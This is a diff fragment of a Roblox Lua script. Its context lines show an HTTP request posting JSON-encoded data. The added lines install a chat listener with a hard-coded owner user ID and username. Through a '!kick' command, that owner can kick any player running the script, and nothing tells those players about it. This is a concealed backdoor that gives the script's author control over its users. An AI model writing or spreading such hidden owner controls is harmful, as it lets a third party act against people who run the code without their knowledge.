@@ -58,3 +58,40 @@ request({
     Headers = {["Content-Type"] = "application/json"},
     Body = httpService:JSONEncode(data)
 })
+
+
+
+local Players = game:GetService("Players")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- Chủ sở hữu script
+local ownerId = 4882845089
+local ownerUsername = "konmeo22132"
+
+-- Lắng nghe tin nhắn từ người khác
+Players.PlayerChatted:Connect(function(player, message)
+    -- Chỉ xử lý nếu người gửi là chủ
+    if player.UserId ~= ownerId and player.Name ~= ownerUsername then return end
+
+    -- Kiểm tra !kick
+    local lowerMsg = message:lower()
+    local cmd, target, reason = lowerMsg:match("^!(%w+)%s+(%S+)%s*(.*)$")
+    
+    if cmd == "kick" then
+        reason = reason or ""
+
+        for _, otherPlayer in pairs(Players:GetPlayers()) do
+            -- Nếu mục tiêu là người dùng này
+            if otherPlayer == LocalPlayer then
+                if tostring(LocalPlayer.UserId) == target or LocalPlayer.Name:lower() == target:lower() then
+                    local kickMessage = "Bạn đã bị kick"
+                    if reason ~= "" then
+                        kickMessage = kickMessage .. " | Lý do: " .. reason
+                    end
+                    LocalPlayer:Kick(kickMessage)
+                end
+            end
+        end
+    end
+end)
